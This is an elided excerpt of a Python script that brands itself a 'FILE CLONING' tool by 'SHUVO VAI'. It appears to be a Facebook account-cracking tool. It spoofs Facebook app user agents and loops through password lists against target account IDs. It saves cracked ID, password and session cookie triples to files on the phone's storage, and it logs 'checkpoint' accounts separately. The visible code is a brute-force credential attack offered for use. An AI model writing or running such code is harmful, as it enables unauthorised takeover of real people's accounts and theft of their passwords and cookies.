...
#-----------------------[ IMPORT ]-----------------------#
import os,cython,requests,json,time,re,random,sys,uuid,string,subprocess,bs4
...
def _____mrpoco_____():
	...
	ua7  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/45.0.0.7887;FBBV/3669564;FBDM/{density=[,width=720,height=1280};FBLC/en_US;FBRV/1973503;FBCR/null;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.mlite;FBDV/Redmi Note 14 5G;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
...
███████║██║  ██║╚██████╔╝ ╚████╔╝ ╚██████╔╝
╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═══╝   ╚═════╝ 
\n{W}{44*'-'}\n{xd} {G}OWNER {W}: {G}SHUVO VAI \n{xd} {G}TOOL  {W}: {G}FILE CLONING\n{W}{44*'-'}'''
#-----------------------[ MAIN MENU ]-----------------------#
def shuvo():
	os.system('xdg-open https://t.me/shuvojit46')
...
def __________method__________(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{xd}~{W}[{G}SK-SHUVOJIT{W}]~[{Y}%s{W}]~[{G}%s{W}]~[{R}%s{W}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/SHUVO-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r{R}[{R}CHECKPOINT{R}]{R} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHUVO-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break       
                        else:continue
                loop+=1
...
try:
	...
	print('\x1b[1;97m[\033[1;32m~\x1b[1;97m] BRO YOUR NETWORK PROBLEM...')
	exit()
except:exit()
